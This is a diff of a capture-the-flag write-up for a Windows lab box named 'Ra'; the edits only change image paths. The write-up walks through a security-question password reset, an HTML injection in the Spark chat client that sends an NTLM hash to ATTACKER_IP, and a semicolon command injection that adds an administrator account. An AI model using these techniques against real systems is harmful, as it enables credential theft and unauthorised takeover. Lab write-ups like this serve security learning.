@@ -137,28 +137,28 @@ Looks to be a Windows machine with Active Directory components, the scan leaks t
 
 The main things I'll focus on are HTTP, SMB, and RDP as they will be the most beneficial. I run a dirsearch in the background to save on time and start enumerating webpages.
 
-![](../assets/img/2026-01-17-Ra/1.png)
+![](/assets/img/2026-01-17-Ra/1.png)
 
 Those all redirected to a 403 Forbidden page.
 
 Checking the landing page on port 80 shows a typical static webpage for the organization. Scrolling down discloses a bunch of names for the IT dept as well as their emails. I copy/paste the source code into a file and use `awk -F'id=|"' '{print $3}' input.txt > users.txt` to extract the addresses.
 
-![](../assets/img/2026-01-17-Ra/2.png)
+![](/assets/img/2026-01-17-Ra/2.png)
 
 Taking some more time to look around shows that we can reset an account password if we answer a security question. One of the photos under the "Employees in focus" tab has a photo with her dog, checking the image's source name gives us the dog's name. I should also note that the name structures employees as first name + two letters of the last name, here it is `img/lilyleAndSparky.jpg` which may be the company's username structure.
 
-![](../assets/img/2026-01-17-Ra/3.png)
+![](/assets/img/2026-01-17-Ra/3.png)
 
 ## Exploitation
 Let's try and reset her password using this info. Supplying lilyle as the username and Sparky as the answer for the pet security question resets her password to `ChangeMe#1234`.
 
 We can use this to authenticate on SMB and enumerate shares using netexec.
 
-![](../assets/img/2026-01-17-Ra/4.png)
+![](/assets/img/2026-01-17-Ra/4.png)
 
 I use this to read the 'Users' share which is good for a user list for the system but nothing else of note, at least that we have access to. Next, I go to the 'Shared' share where I find the first flag as well as some files named `spark_2.8.3*` pertaining to Ignite (a real-time instant messaging platform). 
 
-![](../assets/img/2026-01-17-Ra/5.png)
+![](/assets/img/2026-01-17-Ra/5.png)
 
 We can see that Ignite is running on port 5222 and now that we have the version, let's look for any known exploits. Here are my sources:
 
@@ -172,11 +172,11 @@ _Note: This CVE was actually found by the creator(s) of this box and included it
 
 In order to use IgniteRealtime Spark we must download the client which is conveniently in the same SMB share we got the flag in. I couldn't get Kali to recognize JRE 8 as a valid dependency for the life of me so I switched to the Attack Box for this step.
 
-![](../assets/img/2026-01-17-Ra/6.png)
+![](/assets/img/2026-01-17-Ra/6.png)
 
 Trying to login prompted a certificate error but we can change our settings to accept all certs and successfully login. From here we setup a responder listener using `sudo responder -I tun0` and send a message that includes `<img src="http://ATTACKER_IP/file">` 
 
-![](../assets/img/2026-01-17-Ra/7.png)
+![](/assets/img/2026-01-17-Ra/7.png)
 
 Now that we have the hash, we can use a pass-the-hash attack to login via evil-winrm or try and crack the hash for ease of use later. I'll do the latter.
 
@@ -210,21 +210,21 @@ Stopped: Sat Jan 17 21:27:06 2026
 ## Initial Foothold
 I try to RDP onto the machine with this password but they don't have access to it, so I proceed with evil-winrm instead.
 
-![](../assets/img/2026-01-17-Ra/8.png)
+![](/assets/img/2026-01-17-Ra/8.png)
 
 Here we can grab the second flag under their Desktop folder and start looking for privilege escalation to Administrator. There's nothing else in the home, however I do find a non-standard directory on the `C:\` drive which holds scripts.
 
-![](../assets/img/2026-01-17-Ra/9.png)
+![](/assets/img/2026-01-17-Ra/9.png)
 
 This holds a PowerShell script I'll describe shortly and a log.txt file which displays the last date & time the script has ran. In short, this script checks a list of hosts and pings them, if they do not respond, it stores them in another list and emails the owner of such an occasion.
 
 So how do we exploit this? First I check who owns the script and find that the hosts.txt file is located under the 'Users' share we found earlier.
 
-![](../assets/img/2026-01-17-Ra/10.png)
+![](/assets/img/2026-01-17-Ra/10.png)
 
 Since we're apart of the Account Operators group, we're able to reset anyone's password. Let's do this for Brittany's account using: `net user brittanycr Password123!`.
 
-![](../assets/img/2026-01-17-Ra/11.png)
+![](/assets/img/2026-01-17-Ra/11.png)
 
 ## Privilege Escalation
 We actually don't have WinRM access on this account, but we're able to enumerate SMB shares which allows us to replace the hosts.txt with our malicious one. I'll replace the original file with one that adds a new account with Administrator privileges so we can login whenever.
@@ -235,10 +235,10 @@ This was my payload:
 ;net user cbev Password123! /add;net localgroup Administrators cbev /add
 ```
 
-![](../assets/img/2026-01-17-Ra/12.png)
+![](/assets/img/2026-01-17-Ra/12.png)
 
 Finally, I use evil-winrm to login and grab the third flag under `C:\Users\Administrator`.
 
-![](../assets/img/2026-01-17-Ra/13.png)
+![](/assets/img/2026-01-17-Ra/13.png)
 
 That completes the box, I hope this was helpful to anyone following along or stuck and happy hacking!
